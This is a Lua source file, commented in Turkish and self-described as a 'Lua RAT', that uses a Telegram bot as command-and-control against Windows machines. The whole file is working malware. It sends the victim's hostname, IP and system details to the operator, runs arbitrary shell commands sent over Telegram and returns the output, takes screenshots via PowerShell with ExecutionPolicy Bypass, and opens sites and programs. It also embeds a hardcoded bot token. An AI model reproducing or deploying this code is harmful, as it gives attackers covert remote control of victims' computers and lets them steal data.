local https = require("ssl.https")
local ltn12 = require("ltn12")
local json = require("dkjson")
local socket = require("socket")

local BOT_TOKEN = "AAEWoj62HoWpjP8NybB1S2cf3ysM-DOm_w8"
local ADMIN_ID = "7681611437"
local API_URL = "https://api.telegram.org/bot" .. BOT_TOKEN

local client_info = {
    id = 1,
    hostname = get_hostname(),
    ip = get_local_ip()
}

function get_hostname()
    local f = io.popen("hostname 2>&1")
    local result = f:read("*a")
    f:close()
    return result:gsub("%s+", "")
end

function get_local_ip()
    local f = io.popen("ipconfig 2>&1")
    local result = f:read("*a")
    f:close()
    
    -- Basit IP regex
    local ip = result:match("IPv4[^%d]*([%d]+%.[%d]+%.[%d]+%.[%d]+)")
    return ip or "Unknown"
end

function send_message(chat_id, text)
    local url = API_URL .. "/sendMessage"
    local data = json.encode({
        chat_id = tonumber(chat_id),
        text = text
    })
    
    local response = {}
    local req = {
        url = url,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = #data
        },
        source = ltn12.source.string(data),
        sink = ltn12.sink.table(response)
    }
    
    https.request(req)
end

function get_updates(offset)
    local url = API_URL .. "/getUpdates?timeout=30&offset=" .. (offset or 0)
    local response = {}
    
    local req = {
        url = url,
        method = "GET",
        sink = ltn12.sink.table(response)
    }
    
    https.request(req)
    local data = table.concat(response)
    return json.decode(data)
end

function execute_command(cmd)
    local f = io.popen(cmd .. " 2>&1")
    local result = f:read("*a")
    f:close()
    return result
end

function take_screenshot()
    -- Windows'ta screenshot almak için
    local script = [[
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphic = [System.Drawing.Graphics]::FromImage($image)
        $graphic.CopyFromScreen(0, 0, 0, 0, $screen.Size)
        $image.Save('screenshot.png')
    ]]
    
    local f = io.open("temp.ps1", "w")
    f:write(script)
    f:close()
    
    os.execute("powershell -ExecutionPolicy Bypass -File temp.ps1")
    os.remove("temp.ps1")
    
    return "screenshot.png"
end

function send_file(chat_id, file_path)
    -- Dosya gönderme işlemi (basitleştirilmiş)
    send_message(chat_id, "Dosya: " .. file_path)
end

function show_message(text)
    -- Windows message box göster
    local script = [[
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show(']] .. text .. [[')
    ]]
    
    local f = io.open("msg.ps1", "w")
    f:write(script)
    f:close()
    
    os.execute("powershell -ExecutionPolicy Bypass -File msg.ps1 &")
    os.remove("msg.ps1")
end

function open_calculator()
    os.execute("calc.exe")
end

function open_taskmgr()
    os.execute("taskmgr.exe")
end

function open_website(url)
    os.execute("start " .. url)
end

function get_system_info()
    local info = "Sistem Bilgileri:\n"
    info = info .. "Hostname: " .. client_info.hostname .. "\n"
    info = info .. "IP: " .. client_info.ip .. "\n"
    info = info .. "OS: " .. execute_command("ver") .. "\n"
    info = info .. "User: " .. execute_command("echo %USERNAME%") .. "\n"
    return info
end

-- Ana bot döngüsü
local offset = 0
local connected = false
local current_client = client_info.id

print("Bot başlatılıyor... Client ID: " .. client_info.id)
send_message(ADMIN_ID, "✅ Client #" .. client_info.id .. " bağlandı\nHostname: " .. client_info.hostname .. "\nIP: " .. client_info.ip)

while true do
    local success, updates = pcall(get_updates, offset)
    
    if success and updates and updates.ok then
        for _, update in ipairs(updates.result or {}) do
            if update.update_id then
                offset = update.update_id + 1
            end
            
            local msg = update.message
            if msg and msg.text and tostring(msg.from.id) == ADMIN_ID then
                local cmd = msg.text
                
                -- Komutları işle
                if cmd == "/start" or cmd == "/helpme" then
                    send_message(msg.chat.id, [[
Lua RAT Komutları:
/info - Sistem bilgileri
/screen - Ekran görüntüsü
/calc - Hesap makinesi aç
/taskmgr - Görev yöneticisi aç
/msg [metin] - Mesaj göster
/brow [url] - Site aç
/shell [komut] - Komut çalıştır
]])
                
                elseif cmd == "/info" then
                    local info = get_system_info()
                    send_message(msg.chat.id, info)
                
                elseif cmd == "/screen" then
                    send_message(msg.chat.id, "📸 Ekran görüntüsü alınıyor...")
                    local file = take_screenshot()
                    send_file(msg.chat.id, file)
                    os.remove(file)
                
                elseif cmd == "/calc" then
                    open_calculator()
                    send_message(msg.chat.id, "✅ Hesap makinesi açıldı")
                
                elseif cmd == "/taskmgr" then
                    open_taskmgr()
                    send_message(msg.chat.id, "✅ Görev yöneticisi açıldı")
                
                elseif cmd:match("^/msg ") then
                    local text = cmd:sub(6)
                    show_message(text)
                    send_message(msg.chat.id, "✅ Mesaj gösterildi: " .. text)
                
                elseif cmd:match("^/brow ") then
                    local url = cmd:sub(7)
                    open_website(url)
                    send_message(msg.chat.id, "✅ Site açılıyor: " .. url)
                
                elseif cmd:match("^/shell ") then
                    local command = cmd:sub(8)
                    send_message(msg.chat.id, "🔧 Komut çalıştırılıyor: " .. command)
                    local result = execute_command(command)
                    if #result > 4000 then
                        result = result:sub(1, 4000) .. "..."
                    end
                    send_message(msg.chat.id, "Sonuç:\n" .. result)
                end
            end
        end
    end
    
    socket.sleep(1) -- 1 saniye bekle
end

